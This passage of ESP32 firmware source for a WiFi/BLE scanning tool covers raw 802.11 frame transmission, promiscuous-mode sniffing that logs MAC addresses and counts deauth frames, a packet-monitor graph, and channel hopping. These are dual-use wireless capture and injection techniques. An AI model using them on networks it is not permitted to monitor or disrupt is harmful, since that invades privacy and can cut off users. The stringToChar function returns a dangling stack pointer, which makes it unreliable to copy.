  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));

  packets_sent = packets_sent + 3;
}

void WiFiBleScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  #ifdef HAS_SCREEN
    int buff = display_obj.display_buffer->size();
  #else
    int buff = 0;
  #endif

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      #ifdef HAS_ILI9341
        if (snifferPacket->payload[0] == 0x80)
        {
          num_beacon++;
        }
        else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ))
        {
          num_deauth++;
        }
        else if (snifferPacket->payload[0] == 0x40)
        {
          num_probe++;
        }
      #else
        if (snifferPacket->payload[0] == 0x80)
          display_string.concat(";grn;");
        else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ))
          display_string.concat(";red;");
        else if (snifferPacket->payload[0] == 0x40)
          display_string.concat(";cyn;");
        else
          display_string.concat(";mgn;");
      #endif
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      #ifndef HAS_ILI9341
        display_string.concat(";wht;");
      #endif
    #endif
  }

  char src_addr[] = "00:00:00:00:00:00";
  char dst_addr[] = "00:00:00:00:00:00";
  getMAC(src_addr, snifferPacket->payload, 10);
  getMAC(dst_addr, snifferPacket->payload, 4);
  display_string.concat(src_addr);
  display_string.concat(" -> ");
  display_string.concat(dst_addr);

  int temp_len = display_string.length();

  #ifdef HAS_SCREEN
    // Fill blank space
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
  
    //Serial.print(" ");
  
    #ifdef SCREEN_BUFFER
      //if (display_obj.display_buffer->size() == 0)
      //{
      //  display_obj.loading = true;
        //while(display_obj.display_buffer->size() >= 10)
        //  delay(10);
        if (display_obj.display_buffer->size() >= 10)
          return;

        display_obj.display_buffer->add(display_string);
      //  display_obj.loading = false;
        Serial.println(display_string);
      //}
    #endif
  #endif

  buffer_obj.append(snifferPacket, len);
  //}
}

  void WiFiBleScan::packetMonitorMain(uint32_t currentTime)
  {
    //---------MAIN 'FOR' LOOP! THIS IS WHERE ALL THE ACTION HAPPENS! HAS TO BE FAST!!!!!---------\\
    
    
  //  for (x_pos = (11 + x_scale); x_pos <= 320; x_pos += x_scale) //go along every point on the x axis and do something, start over when finished
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
      
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      boolean pressed = false;
      
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      #ifdef HAS_ILI9341
        pressed = display_obj.tft.getTouch(&t_x, &t_y);
      #endif
  
      if (pressed) {
        Serial.print("Got touch | X: ");
        Serial.print(t_x);
        Serial.print(" Y: ");
        Serial.println(t_y);
      }
  
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }
      
      // Which buttons pressed
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (display_obj.key[b].justPressed())
        {
          Serial.println("Bro, key pressed");
          //do_break = true;
        }
  
        if (display_obj.key[b].justReleased())
        {
          do_break = true;
          
          // X - button pressed
          if (b == 0) {
            if (x_scale > 1) {
              x_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              break;
            }
          }
          // X + button pressed
          else if (b == 1) {
            if (x_scale < 6) {
              x_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              break;
            }
          }
  
          // Y - button pressed
          else if (b == 2) {
            if (y_scale > 1) {
              y_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              break;
            }
          }
  
          // Y + button pressed
          else if (b == 3) {
            if (y_scale < 9) {
              y_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              break;
            }
          }
  
          // Channel - button pressed
          else if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            //display_obj.tft.init();
            this->orient_display = true;
            return;
          }
        }
      }
  
      if (currentTime - initTime >= GRAPH_REFRESH) {
        //Serial.println("-----------------------------------------");
        //Serial.println("Time elapsed: " + (String)(currentTime - initTime) + "ms");
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_beacon * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        y_pos_y = ((-num_deauth * (y_scale * 3)) + (HEIGHT_1 - 2)); // RED
        y_pos_z = ((-num_probe * (y_scale * 3)) + (HEIGHT_1 - 2)); // BLUE
  
        //Serial.println("num_beacon: " + (String)num_beacon);
        //Serial.println("num_deauth: " + (String)num_deauth);
        //Serial.println(" num_probe: " + (String)num_probe);
    
        num_beacon = 0;
        num_probe = 0;
        num_deauth = 0;
        
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_GREEN);
        //Plot "Z" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_z_old, x_pos, y_pos_z, TFT_BLUE);
        //Plot "Y" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_y_old, x_pos, y_pos_y, TFT_RED);
        
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        //if ((x_pos <= 90) || ((x_pos >= 198) && (x_pos <= 320))) //above x axis
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
        {
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        }
        else
        {
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!
        }
        //if ((x_pos >= 254) && (x_pos <= 320)) //below x axis
        //if (x_pos <= 90)
        if (x_pos < 0) // below x axis
        {
          //tft.fillRect(x_pos+1, 121, 10, 88, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        }
        else
        {
          //tft.fillRect(x_pos+1, 121, 10, 119, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
        }
        
        //tftDisplayTime();
        
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
        {
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
        }
         
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
        y_pos_y_old = y_pos_y;
        y_pos_z_old = y_pos_z;
    
        //delay(50);
      }
  
      #ifdef HAS_SD
        sd_obj.main();
      #endif
     
    }
    
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    //tft.fillRect(56, 0, 66, 32, TFT_ORANGE); //erase time and color key and any stray lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    
    display_obj.tftDrawXScaleButtons(x_scale); //redraw stuff
    display_obj.tftDrawYScaleButtons(y_scale);
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }

void WiFiBleScan::changeChannel(int chan) {
  this->set_channel = chan;
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

void WiFiBleScan::changeChannel()
{
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

// Function to cycle to the next channel
void WiFiBleScan::channelHop()
{
  this->set_channel = this->set_channel + 1;
  if (this->set_channel > 13) {
    this->set_channel = 1;
  }
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

char* WiFiBleScan::stringToChar(String string) {
  char buf[string.length() + 1] = {};
  string.toCharArray(buf, string.length() + 1);

  return buf;
}


// Function for updating scan status
void WiFiBleScan::main(uint32_t currentTime)
{
  // WiFi operations
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  //(currentScanMode == WIFI_SCAN_STATION) ||
  //(currentScanMode == WIFI_SCAN_SIG_STREN) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_SCAN_ALL))
  {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
      channelHop();
    }
  }
  else if (currentScanMode == WIFI_SCAN_GPS_DATA) {
    if (currentTime - initTime >= 5000) {
      this->initTime = millis();
      this->RunGPSInfo();
    }
  }
  else if (currentScanMode == WIFI_SCAN_GPS_NMEA) {
    if (currentTime - initTime >= 1000) {
      this->initTime = millis();
      this->RunGPSNmea();
    }
  }
  else if (currentScanMode == WIFI_PACKET_MONITOR)
  {
    #ifdef HAS_SCREEN
      #ifdef HAS_ILI9341
        packetMonitorMain(currentTime);
      #endif
    #endif
  }
  #ifdef HAS_GPS
    else if ((currentScanMode == WIFI_SCAN_OFF))
      if(gps_obj.queue_enabled())
        gps_obj.disable_queue();
  #endif
}
